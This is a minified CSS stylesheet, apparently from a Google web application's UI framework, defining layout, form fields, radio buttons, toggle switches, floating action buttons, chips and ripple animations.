.VxoKGd.PjtIae .fdWl7b {
	overflow: hidden
}

@media all and (min-width:601px) {
	.VxoKGd.DbQnIe .fdWl7b {
		display: flex;
		justify-content: space-between
	}
}

.lzBHPc {
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	margin-left: 12px
}

.PlRDoc.PlRDoc {
	height: 24px;
	width: 24px
}

.VxoKGd.PjtIae .PlRDoc {
	margin-top: 32px
}

.wRNPwe {
	color: rgba(0, 0, 0, 0.651);
	display: inline-block;
	height: 24px;
	width: 24px;
	vertical-align: middle
}

.PlRDoc .pVlEsd,
.PlRDoc.eO2Zfd .S7pdP {
	display: inline-block
}

.PlRDoc .S7pdP,
.PlRDoc.eO2Zfd .pVlEsd {
	display: none
}

.VxoKGd .T8qVIf {
	margin-top: 6px
}

.Lhf3Ae {
	display: block;
	font-weight: 500;
	overflow: hidden;
	text-overflow: ellipsis
}

.x50Pqf {
	margin-top: 0;
	padding-top: 0
}

.ErM6Zc {
	color: #5f6368;
	font-size: 14px;
	margin-bottom: 0;
	line-height: 18px;
	padding-top: 0;
	padding-bottom: 0;
	margin-top: 1em
}

.sBogad {
	direction: ltr;
	font-size: 16px;
	-webkit-text-security: disc
}

.OC1iVe {
	color: #5f6368;
	font-size: 12px;
	line-height: 1.3333;
	margin-top: 0
}

.Q3HNJ.Q3HNJ {
	-webkit-box-sizing: content-box;
	box-sizing: content-box
}

.Q3HNJ .zHQkBf {
	font-size: 16px
}

.Q3HNJ.OcVpRe .zHQkBf {
	font-size: 14px;
	height: 20px;
	padding: 7px 11px
}

.Q3HNJ.OcVpRe .u3bW4e .zHQkBf,
.Q3HNJ.OcVpRe .IYewr .zHQkBf {
	font-size: 14px;
	height: 20px;
	padding: 6px 10px
}

.Q3HNJ .RxsGPe:empty {
	-webkit-box-flex: none;
	-webkit-flex: none;
	flex: none;
	min-height: 0;
	padding-top: 0
}

.DlJ5eb {
	width: 100%
}

.Q3HNJ .N3Hzgf {
	padding-top: 16px;
	padding-bottom: 4px
}

.Q3HNJ:first-child .N3Hzgf {
	padding-top: 8px
}

.Q3HNJ .DlJ5eb .oJeWuf {
	height: 56px;
	padding-top: 0
}

.Q3HNJ.OcVpRe .DlJ5eb .oJeWuf {
	height: 36px
}

.Q3HNJ.OcVpRe .snByac {
	bottom: 9px;
	color: #5f6368;
	font-size: 14px;
	left: 6px;
	padding: 0 6px
}

.Q3HNJ.OcVpRe .u3bW4e .snByac,
.Q3HNJ.OcVpRe .CDELXb .snByac {
	-webkit-transform: scale(.75) translateY(-155%);
	transform: scale(.75) translateY(-155%)
}

.Q3HNJ .eU809d {
	border-top-color: rgba(0, 0, 0, 0.38)
}

.Q3HNJ .OA0qNb {
	background: #fff
}

.Q3HNJ .OA0qNb>.VOUU9e {
	border-color: #dadce0
}

.Q3HNJ .iWO5td .LMgvRb,
.Q3HNJ .iWO5td .CO1lLb {
	color: #202124
}

.Q3HNJ .iWO5td .LMgvRb.KKjvXb {
	color: #202124;
	background: rgba(60, 64, 67, 0.039)
}

.Q3HNJ .r5iSrd.lPGq1c {
	margin-top: 20px
}

.Q3HNJ:first-child .r5iSrd.lPGq1c {
	margin-top: 12px
}

.Q3HNJ.OcVpRe .r5iSrd.lPGq1c {
	margin-top: 9px
}

.qclxzb {
	-webkit-box-align: center;
	box-align: center;
	-webkit-align-items: center;
	align-items: center;
	box-pack: center;
	-webkit-box-pack: center;
	-webkit-justify-content: center;
	justify-content: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	height: 24px;
	width: 24px
}

.r5iSrd {
	-webkit-box-align: end;
	box-align: end;
	-webkit-align-items: flex-end;
	align-items: flex-end;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	height: 40px;
	line-height: 16px;
	padding-right: 12px;
	width: 64px
}

.r5iSrd.oedvKc {
	width: auto
}

.r5iSrd.lPGq1c {
	margin-top: 24px
}

.CO1lLb {
	color: rgba(0, 0, 0, 0.54);
	padding-left: 8px
}

.r5iSrd.oedvKc .aCjZuc {
	padding-bottom: 0
}

.aCjZuc .uLX2p {
	height: 24px;
	opacity: 1;
	width: 24px
}

.r5iSrd.oedvKc .aCjZuc .uLX2p {
	display: inline-block;
	padding-right: 16px;
	position: initial
}

.r5iSrd .eU809d {
	top: 14px
}

.qqYQWe {
	-webkit-box-align: start;
	box-align: start;
	-webkit-align-items: flex-start;
	align-items: flex-start;
	display: -webkit-inline-box;
	display: -webkit-inline-flex;
	display: inline-flex
}

.RSJo4e {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	width: 188px
}

.RSJo4e .zHQkBf {
	direction: ltr
}

.CTH7Xe {
	display: none
}

.OEtnvd {
	height: 130px;
	margin: 30px auto 25px;
	position: relative;
	width: 130px
}

.MexQx {
	height: 100%;
	width: 100%
}

.VLxNSd {
	background: rgba(255, 255, 255, 0.9);
	height: 100%;
	position: absolute;
	top: 0;
	width: 100%
}

.FhODw {
	bottom: 0;
	left: 0;
	margin: auto;
	position: absolute;
	right: 0;
	top: 0
}

.TpeQ8e {
	color: #d93025;
	margin-top: 20px;
	text-align: center
}

.kANMQc {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	padding: 16px 0
}

.bNHYT {
	-webkit-flex-shrink: 0;
	flex-shrink: 0
}

.bNHYT .MbhUzd {
	background-color: rgba(26, 115, 232, 0.2)
}

.bNHYT .Id5V1 {
	border-color: #5f6368
}

.bNHYT.RDPZE .Id5V1 {
	border-color: rgba(0, 0, 0, 0.26)
}

.bNHYT.N2RpBe .nQOrEb,
.bNHYT.N2RpBe .Id5V1 {
	border-color: #1a73e8
}

.bNHYT.RDPZE+.YCHOH,
.bNHYT.RDPZE+.YCHOH .Wu29ob {
	color: rgba(32, 33, 36, 0.502)
}

.YCHOH {
	padding-bottom: 3px;
	padding-top: -3px;
	color: #202124;
	margin-left: 16px
}

.Wu29ob {
	padding-bottom: 0;
	padding-top: 0;
	color: #5f6368;
	font-size: 12px;
	line-height: 1.3333;
	margin-bottom: 0;
	margin-top: 0
}

.zJKIV {
	-webkit-user-select: none;
	-webkit-transition: border-color .2s cubic-bezier(0.4, 0, 0.2, 1);
	transition: border-color .2s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-tap-highlight-color: transparent;
	-webkit-border-radius: 3px;
	border-radius: 3px;
	-webkit-box-sizing: content-box;
	box-sizing: content-box;
	cursor: pointer;
	display: inline-block;
	height: 20px;
	outline: none;
	position: relative;
	vertical-align: middle;
	width: 20px;
	z-index: 0
}

.SCWude {
	-webkit-animation: quantumWizPaperAnimateSelectOut .2s forwards;
	animation: quantumWizPaperAnimateSelectOut .2s forwards;
	position: relative;
	width: 20px;
	height: 20px;
	cursor: pointer
}

[aria-checked="true"]>.SCWude {
	-webkit-animation: quantumWizPaperAnimateSelectIn .2s .1s forwards;
	animation: quantumWizPaperAnimateSelectIn .2s .1s forwards
}

.t5nRo {
	position: absolute;
	top: 0;
	left: 0;
	width: 16px;
	height: 16px;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	border: solid 2px;
	border-color: rgba(0, 0, 0, 0.54)
}

.N2RpBe .t5nRo {
	border-color: #009688
}

.wEIpqb {
	position: absolute;
	top: 50%;
	left: 50%;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	border: 5px solid #009688;
	-webkit-transition: -webkit-transform ease .28s;
	transition: -webkit-transform ease .28s;
	-webkit-transition: transform ease .28s;
	transition: transform ease .28s;
	-webkit-transform: translateX(-50%) translateY(-50%) scale(0);
	transform: translateX(-50%) translateY(-50%) scale(0)
}

[aria-checked="true"] .wEIpqb {
	-webkit-transform: translateX(-50%) translateY(-50%) scale(1);
	transform: translateX(-50%) translateY(-50%) scale(1)
}

.zJKIV[aria-disabled="true"] {
	cursor: default;
	pointer-events: none
}

[aria-disabled="true"][aria-checked="true"] .wEIpqb,
[aria-disabled="true"] .t5nRo {
	border-color: rgba(0, 0, 0, 0.26)
}

.k5cvGe {
	-webkit-transform: scale(3);
	transform: scale(3);
	-webkit-transition: opacity .15s ease;
	transition: opacity .15s ease;
	background-color: rgba(0, 0, 0, 0.2);
	-webkit-border-radius: 100%;
	border-radius: 100%;
	height: 20px;
	left: 0;
	opacity: 0;
	outline: .1px solid transparent;
	pointer-events: none;
	position: absolute;
	width: 20px;
	z-index: -1
}

.qs41qe>.k5cvGe {
	-webkit-animation: quantumWizRadialInkSpread .3s;
	animation: quantumWizRadialInkSpread .3s;
	-webkit-animation-fill-mode: forwards;
	animation-fill-mode: forwards;
	opacity: 1
}

.i9xfbb>.k5cvGe {
	background-color: rgba(0, 150, 136, 0.2)
}

.u3bW4e>.k5cvGe {
	-webkit-animation: quantumWizRadialInkFocusPulse .7s infinite alternate;
	animation: quantumWizRadialInkFocusPulse .7s infinite alternate;
	background-color: rgba(0, 150, 136, 0.2);
	opacity: 1
}

@keyframes quantumWizPaperAnimateSelectIn {
	0% {
		height: 0;
		width: 0
	}
	to {
		height: 100%;
		width: 100%
	}
}

@-webkit-keyframes quantumWizPaperAnimateSelectIn {
	0% {
		height: 0;
		width: 0
	}
	to {
		height: 100%;
		width: 100%
	}
}

@keyframes quantumWizPaperAnimateSelectOut {
	0% {
		height: 0;
		width: 0
	}
	to {
		height: 100%;
		width: 100%
	}
}

@-webkit-keyframes quantumWizPaperAnimateSelectOut {
	0% {
		height: 0;
		width: 0
	}
	to {
		height: 100%;
		width: 100%
	}
}

.xsKFM {
	color: #d93025
}

.f9YRsb {
	top: -12px
}

.f9YRsb .Ce1Y1c {
	color: #5f6368
}

.yxE0kd {
	color: #202124
}

.nzBtIb {
	font-size: 14px;
	margin: 0 8px
}

.Vq7W7e {
	margin: 0 -8px
}

.Vq7W7e .TpYURb,
.Vq7W7e .N3Hzgf {
	padding-top: 16px
}

.ijRrf {
	min-height: 16px;
	padding: 4px 8px 0;
	color: #d93025;
	display: block;
	font-size: 12px;
	line-height: 16px;
	padding-right: 32px
}

.ijRrf:empty {
	display: none
}

.F8Czgd {
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	display: inline-block;
	padding: 0 8px;
	vertical-align: top;
	width: 33.333333333333333%
}

.F8Czgd .RAKLkc {
	margin-bottom: 0
}

.Vq7W7e.OcVpRe .F8Czgd .TpYURb,
.Vq7W7e.OcVpRe .F8Czgd .N3Hzgf {
	padding-top: 24px
}

.Vq7W7e:first-child .F8Czgd .TpYURb,
.Vq7W7e:first-child .F8Czgd .N3Hzgf {
	padding-top: 8px
}

.xcVVPe .F8Czgd {
	width: 50%
}

.akwVEf .ACpCs {
	padding-top: 16px
}

.akwVEf .OcVpRe .ACpCs {
	padding-top: 24px
}

.akwVEf:first-child .ACpCs,
.akwVEf:first-child .OcVpRe .ACpCs {
	padding-top: 8px
}

.ACpCs .MQL3Ob {
	padding-left: 6px;
	padding-right: 15px
}

.ACpCs.pXgSje.u3bW4e .MQL3Ob {
	padding-right: 15px;
	padding-left: 5px
}

.akwVEf .OcVpRe .MQL3Ob {
	padding-right: 11px
}

.ACpCs.CDELXb.YuII8b .MQL3Ob {
	opacity: 0
}

.LdOEpb {
	color: #202124;
	direction: ltr;
	display: inline-block
}

.S9BUjf {
	list-style: none;
	padding: 0
}

.oMzjQd {
	padding: 0;
	display: inline-block;
	margin: 0 6px 8px 6px
}

.oMzjQd:hover {
	cursor: pointer
}

.yY9Csf {
	display: inline-block
}

.Ke62ne {
	width: 100%;
	border: 0
}

.IRzIrd {
	-webkit-align-items: flex-start;
	align-items: flex-start;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-flex: 0;
	box-flex: 0;
	-webkit-flex-grow: 0;
	flex-grow: 0;
	-webkit-flex-wrap: wrap;
	flex-wrap: wrap;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	margin-left: -8px;
	margin-top: 32px;
	min-height: 48px;
	padding-bottom: 20px
}

.JL61od {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: row-reverse;
	flex-direction: row-reverse;
	-webkit-flex-wrap: wrap;
	flex-wrap: wrap;
	width: 100%
}

.TkBGSb {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	text-align: right
}

.IRzIrd.F8PBrb .TkBGSb {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	-webkit-flex-wrap: wrap;
	flex-wrap: wrap;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	padding-left: 8px;
	width: 100%
}

.TkBGSb .snByac {
	max-width: 300px
}

.j6mS1d .snByac {
	margin: 8px 16px
}

.raEKvf {
	-webkit-flex: 0 0 calc(50% - 4px);
	flex: 0 0 calc(50% - 4px);
	width: 114px
}

.U1zXDb:first-of-type {
	border-top: 1px solid #e0e0e0;
	margin-top: 6px
}

.UV4uhb.UV4uhb {
	-webkit-box-sizing: content-box;
	box-sizing: content-box
}

.UV4uhb.N2RpBe .espmsb {
	border-color: #4285f4
}

.UV4uhb.N2RpBe>.MLPG7 {
	border-color: rgba(66, 133, 244, 0.502)
}

.UV4uhb.i9xfbb>.MbhUzd,
.UV4uhb.u3bW4e>.MbhUzd {
	background-color: rgba(66, 133, 244, 0.2)
}

.mpYfdb {
	border-bottom: 1px solid #dadce0;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	padding: 16px 0 13px 0
}

.wwR6Lb {
	-webkit-box-flex: none;
	-webkit-flex: none;
	flex: none;
	padding: 2px
}

.KTCurd {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	margin-right: 16px
}

.xusF5e {
	font-size: 16px;
	font-weight: bold
}

.anhwIe {
	padding-bottom: 0;
	padding-top: 0
}

.LsSwGf {
	-webkit-user-select: none;
	-webkit-tap-highlight-color: transparent;
	-webkit-box-sizing: content-box;
	box-sizing: content-box;
	cursor: pointer;
	display: inline-block;
	height: 20px;
	outline: none;
	position: relative;
	vertical-align: middle;
	width: 37px;
	z-index: 0
}

.LsSwGf[aria-disabled="true"] {
	cursor: default
}

.E7QdY {
	-webkit-transition: border-color .3s ease;
	transition: border-color .3s ease;
	border: 10px solid #fafafa;
	-webkit-border-radius: 100%;
	border-radius: 100%;
	position: absolute;
	-webkit-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.4);
	box-shadow: 0 1px 3px rgba(0, 0, 0, 0.4)
}

[aria-checked="true"] .E7QdY {
	border-color: #009688
}

[aria-disabled="true"] .E7QdY {
	border-color: #bdbdbd
}

.rbsY8b {
	-webkit-transition: -webkit-transform .06s ease;
	transition: -webkit-transform .06s ease;
	-webkit-transition: transform .06s ease;
	transition: transform .06s ease
}

.LsSwGf.N2RpBe>.rbsY8b {
	-webkit-transform: translate(17px);
	transform: translate(17px)
}

.LsSwGf.B6Vhqe>.rbsY8b {
	-webkit-transform: translate(8.5px);
	transform: translate(8.5px)
}

.hh4xKf {
	-webkit-transition: border-color .3s ease;
	transition: border-color .3s ease;
	border: 7px solid #b9b9b9;
	-webkit-border-radius: 7px;
	border-radius: 7px;
	position: absolute;
	top: 3px;
	width: 23px
}

[aria-checked="true"]>.hh4xKf {
	border-color: rgba(0, 150, 136, 0.502)
}

[aria-disabled="true"]>.hh4xKf {
	border-color: #b9b9b9
}

[aria-checked="mixed"] .E7QdY {
	border-color: #f4b400
}

[aria-checked="mixed"] .hh4xKf {
	border-color: #e0e0e0
}

[aria-checked="mixed"] .YGFwk {
	left: 8.5px
}

.YGFwk {
	-webkit-transform: scale(2.5);
	transform: scale(2.5);
	-webkit-transition: opacity .15s ease, left .3s ease;
	transition: opacity .15s ease, left .3s ease;
	background-color: rgba(0, 0, 0, 0.2);
	-webkit-border-radius: 100%;
	border-radius: 100%;
	height: 20px;
	left: 0;
	opacity: 0;
	outline: .1px solid transparent;
	pointer-events: none;
	position: absolute;
	width: 20px;
	z-index: -1
}

.qs41qe>.YGFwk {
	-webkit-animation: quantumWizRadialInkSpread .3s;
	animation: quantumWizRadialInkSpread .3s;
	-webkit-animation-fill-mode: forwards;
	animation-fill-mode: forwards;
	opacity: 1
}

[aria-checked="true"]>.YGFwk {
	left: 17px
}

.i9xfbb>.YGFwk {
	background-color: rgba(0, 150, 136, 0.2)
}

.u3bW4e>.YGFwk {
	-webkit-animation: quantumWizRadialInkFocusPulse .7s infinite alternate;
	animation: quantumWizRadialInkFocusPulse .7s infinite alternate;
	background-color: rgba(0, 150, 136, 0.2);
	opacity: 1
}

c-wiz {
	contain: style
}

c-wiz>c-data {
	display: none
}

c-wiz.rETSD {
	contain: none
}

c-wiz.Ubi8Z {
	contain: layout style
}

.es0ex {
	position: relative;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.es0ex.G03iKb {
	-webkit-flex-direction: row-reverse;
	flex-direction: row-reverse
}

.es0ex.Didmac {
	-webkit-flex-direction: row;
	flex-direction: row
}

.es0ex.XPO28d {
	-webkit-flex-direction: column-reverse;
	flex-direction: column-reverse
}

.es0ex.H1J9xf {
	-webkit-flex-direction: column;
	flex-direction: column
}

.es0ex>.qjhGk {
	position: absolute;
	display: inherit;
	-webkit-flex-direction: inherit;
	flex-direction: inherit;
	opacity: 0;
	z-index: 1;
	-webkit-transition: opacity .2s ease-out;
	transition: opacity .2s ease-out
}

.es0ex.Didmac>.qjhGk {
	left: 64px
}

.es0ex.G03iKb>.qjhGk {
	right: 64px
}

.es0ex.XPO28d>.qjhGk {
	bottom: 64px
}

.es0ex.H1J9xf>.qjhGk {
	top: 64px
}

.es0ex>.qjhGk.eLNT1d {
	display: none
}

.es0ex>.qjhGk.FVKzAb {
	opacity: 1;
	-webkit-transition: opacity .2s ease-in;
	transition: opacity .2s ease-in
}

.XHsn7e {
	background-color: #000;
	border: none;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	-webkit-box-sizing: content-box;
	box-sizing: content-box;
	-webkit-box-shadow: 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12), 0 3px 5px -1px rgba(0, 0, 0, 0.2);
	box-shadow: 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12), 0 3px 5px -1px rgba(0, 0, 0, 0.2);
	cursor: pointer;
	display: inline-block;
	fill: #fff;
	height: 56px;
	outline: none;
	overflow: hidden;
	position: relative;
	text-align: center;
	width: 56px;
	z-index: 4000
}

.HaXdpb {
	background: rgba(255, 255, 255, 0.2);
	bottom: 0;
	display: none;
	left: 0;
	position: absolute;
	right: 0;
	top: 0
}

.XHsn7e:hover {
	-webkit-box-shadow: 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2);
	box-shadow: 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2)
}

.XHsn7e:hover .HaXdpb {
	display: block
}

.XHsn7e.qs41qe {
	-webkit-box-shadow: 0 12px 17px 2px rgba(0, 0, 0, 0.14), 0 5px 22px 4px rgba(0, 0, 0, 0.12), 0 7px 8px -4px rgba(0, 0, 0, 0.2);
	box-shadow: 0 12px 17px 2px rgba(0, 0, 0, 0.14), 0 5px 22px 4px rgba(0, 0, 0, 0.12), 0 7px 8px -4px rgba(0, 0, 0, 0.2)
}

.XHsn7e.qs41qe .HaXdpb {
	display: block
}

.XHsn7e.RDPZE {
	background: rgba(153, 153, 153, 0.102);
	-webkit-box-shadow: none;
	box-shadow: none;
	color: rgba(68, 68, 68, 0.502);
	cursor: default;
	fill: rgba(68, 68, 68, 0.502)
}

.XHsn7e.RDPZE:hover {
	opacity: 1
}

.XHsn7e.RDPZE .HaXdpb {
	display: none
}

.XHsn7e:focus {
	-webkit-box-shadow: 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2);
	box-shadow: 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2)
}

.XHsn7e:focus .HaXdpb {
	display: block
}

.Ip8zfc {
	display: inline-block;
	height: 24px;
	position: absolute;
	top: 16px;
	left: 16px;
	width: 24px;
	-webkit-transform: rotate(0);
	transform: rotate(0);
	-webkit-transition: all .3s ease-in-out;
	transition: all .3s ease-in-out
}

.Ip8zfc.eLNT1d {
	opacity: 0;
	visibility: hidden;
	-webkit-transform: rotate(225deg);
	transform: rotate(225deg);
	-webkit-transition: all .3s ease-in-out;
	transition: all .3s ease-in-out
}

.Ip8zfc.ReqAjb {
	-webkit-transform: rotate(135deg);
	transform: rotate(135deg);
	-webkit-transition: all .3s ease-in-out;
	transition: all .3s ease-in-out
}

.dURtfb {
	height: 40px;
	width: 40px
}

.dURtfb .Ip8zfc {
	top: 8px;
	left: 8px
}

.HRp7vf {
	-webkit-transform: translate(-50%, -50%) scale(0);
	transform: translate(-50%, -50%) scale(0);
	-webkit-transition: opacity .2s ease, visibility 0s ease .2s, transform 0s ease .2s;
	transition: opacity .2s ease, visibility 0s ease .2s, transform 0s ease .2s;
	-webkit-transition: opacity .2s ease, visibility 0s ease .2s, -webkit-transform 0s ease .2s;
	transition: opacity .2s ease, visibility 0s ease .2s, -webkit-transform 0s ease .2s;
	background-image: radial-gradient(circle farthest-side, rgba(204, 204, 204, 0.251), rgba(204, 204, 204, 0.251) 80%, rgba(204, 204, 204, 0) 100%);
	-webkit-background-size: cover;
	background-size: cover;
	left: 0;
	opacity: 0;
	pointer-events: none;
	position: absolute;
	top: 0;
	visibility: hidden
}

.XHsn7e.qs41qe>.HRp7vf {
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	opacity: 1;
	visibility: visible
}

.XHsn7e.qs41qe.M9Bg4d>.HRp7vf {
	-webkit-transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1);
	-webkit-transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1), opacity .2s cubic-bezier(0.0, 0.0, 0.2, 1)
}

.XHsn7e.j7nIZb>.HRp7vf {
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	visibility: visible
}

.sbsxqb {
	pointer-events: none;
	-webkit-transition: opacity .15s cubic-bezier(0.4, 0.0, 0.2, 1) .15s;
	transition: opacity .15s cubic-bezier(0.4, 0.0, 0.2, 1) .15s;
	bottom: 0;
	left: 0;
	position: fixed;
	right: 0;
	top: 0;
	opacity: 0;
	z-index: 5000;
	background-color: rgba(0, 0, 0, 0.502)
}

.sbsxqb.iWO5td {
	pointer-events: all;
	-webkit-transition: opacity .05s cubic-bezier(0.4, 0.0, 0.2, 1);
	transition: opacity .05s cubic-bezier(0.4, 0.0, 0.2, 1);
	opacity: 1
}

.JRtysb {
	-webkit-user-select: none;
	-webkit-transition: background .3s;
	transition: background .3s;
	border: 0;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	color: #444;
	cursor: pointer;
	display: inline-block;
	fill: #444;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	height: 48px;
	outline: none;
	overflow: hidden;
	position: relative;
	text-align: center;
	-webkit-tap-highlight-color: transparent;
	width: 48px;
	z-index: 0
}

.JRtysb.u3bW4e,
.JRtysb.qs41qe,
.JRtysb.j7nIZb {
	-webkit-transform: translateZ(0);
	-webkit-mask-image: -webkit-radial-gradient(circle, white 100%, black 100%)
}

.JRtysb.RDPZE {
	cursor: default
}

.ZDSs1 {
	color: rgba(255, 255, 255, 0.749);
	fill: rgba(255, 255, 255, 0.749)
}

.WzwrXb.u3bW4e {
	background-color: rgba(153, 153, 153, 0.4)
}

.ZDSs1.u3bW4e {
	background-color: rgba(204, 204, 204, 0.251)
}

.NWlf3e {
	-webkit-transform: translate(-50%, -50%) scale(0);
	transform: translate(-50%, -50%) scale(0);
	-webkit-transition: opacity .2s ease;
	transition: opacity .2s ease;
	-webkit-background-size: cover;
	background-size: cover;
	left: 0;
	opacity: 0;
	pointer-events: none;
	position: absolute;
	top: 0;
	visibility: hidden
}

.JRtysb.iWO5td>.NWlf3e {
	-webkit-transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1);
	-webkit-transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1);
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	opacity: 1;
	visibility: visible
}

.JRtysb.j7nIZb>.NWlf3e {
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	visibility: visible
}

.WzwrXb.iWO5td>.NWlf3e {
	background-image: radial-gradient(circle farthest-side, rgba(153, 153, 153, 0.4), rgba(153, 153, 153, 0.4) 80%, rgba(153, 153, 153, 0) 100%)
}

.ZDSs1.iWO5td>.NWlf3e {
	background-image: radial-gradient(circle farthest-side, rgba(204, 204, 204, 0.251), rgba(204, 204, 204, 0.251) 80%, rgba(204, 204, 204, 0) 100%)
}

.WzwrXb.RDPZE {
	color: rgba(68, 68, 68, 0.502);
	fill: rgba(68, 68, 68, 0.502)
}

.ZDSs1.RDPZE {
	color: rgba(255, 255, 255, 0.502);
	fill: rgba(255, 255, 255, 0.502)
}

.MhXXcc {
	line-height: 44px;
	position: relative
}

.Lw7GHd {
	margin: 8px;
	display: inline-block
}

.cTPETe {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.u1Djpb {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	height: 22px;
	-webkit-border-radius: 11px;
	border-radius: 11px;
	margin: 0 6px 0 0;
	padding-left: 12px;
	white-space: nowrap;
	color: rgba(0, 0, 0, 0.87);
	background-color: #e0e0e0;
	font-size: 14px
}

.fb31zf {
	margin: auto
}

.GorKAf {
	display: inline-block;
	position: relative;
	margin: 3px;
	width: 16px;
	height: 16px;
	background-color: rgba(0, 0, 0, 0.38);
	-webkit-border-radius: 50%;
	border-radius: 50%
}

.GorKAf::before {
	content: '';
	position: absolute;
	width: 10px;
	height: 2px;
	top: 7px;
	background-color: #e0e0e0
}

.GorKAf::after {
	content: '';
	position: absolute;
	width: 10px;
	height: 2px;
	top: 7px;
	background-color: #e0e0e0
}

.GorKAf::before {
	-webkit-transform: rotate(45deg);
	transform: rotate(45deg);
	left: 3px
}

.GorKAf::after {
	-webkit-transform: rotate(-45deg);
	transform: rotate(-45deg);
	right: 3px
}

.u1Djpb:hover {
	color: white;
	background-color: #616161
}

.u1Djpb:hover .GorKAf::before,
.u1Djpb:hover .GorKAf::after {
	background-color: #616161
}

.u1Djpb:hover .GorKAf {
	background-color: white
}

.RWzxl {
	-webkit-user-select: none;
	-webkit-tap-highlight-color: transparent;
	display: inline-block;
	outline: none;
	width: 200px
}

.KzNPgc {
	position: relative;
	vertical-align: top
}

.JGptt {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.Hvn9fb {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	-webkit-flex-shrink: 1;
	flex-shrink: 1;
	background-color: transparent;
	border: none;
	display: block;
	font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	margin: 0;
	min-width: 0%;
	outline: none;
	padding: .125em 0;
	z-index: 0
}

.SPcBRc {
	background-color: rgba(0, 0, 0, 0.12);
	height: 1px;
	margin: 0;
	padding: 0;
	width: 100%
}

.kPBwDb {
	-webkit-transform: scaleX(0);
	transform: scaleX(0);
	background-color: #03a9f4;
	height: 2px;
	margin: 0;
	padding: 0;
	width: 100%
}

.RWzxl.RDPZE .Hvn9fb {
	color: rgba(0, 0, 0, 0.38)
}

.RWzxl.RDPZE>.KzNPgc>.SPcBRc {
	background: none;
	border-bottom: 1px dotted rgba(0, 0, 0, 0.38)
}

.kPBwDb.Y2Zypf {
	-webkit-animation: quantumWizSimpleInputRemoveUnderline .3s cubic-bezier(0.4, 0, 0.2, 1);
	animation: quantumWizSimpleInputRemoveUnderline .3s cubic-bezier(0.4, 0, 0.2, 1)
}

.RWzxl.u3bW4e>.KzNPgc>.kPBwDb {
	-webkit-animation: quantumWizSimpleInputAddUnderline .3s cubic-bezier(0.4, 0, 0.2, 1);
	animation: quantumWizSimpleInputAddUnderline .3s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-transform: scaleX(1);
	transform: scaleX(1)
}

.BYyR7e {
	color: rgba(0, 0, 0, 0.38);
	font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	max-width: 100%;
	overflow: hidden;
	pointer-events: none;
	position: absolute;
	text-overflow: ellipsis;
	white-space: nowrap
}

.RWzxl.CDELXb>.KzNPgc>.BYyR7e {
	display: none
}

@keyframes quantumWizSimpleInputRemoveUnderline {
	0% {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 1
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 0
	}
}

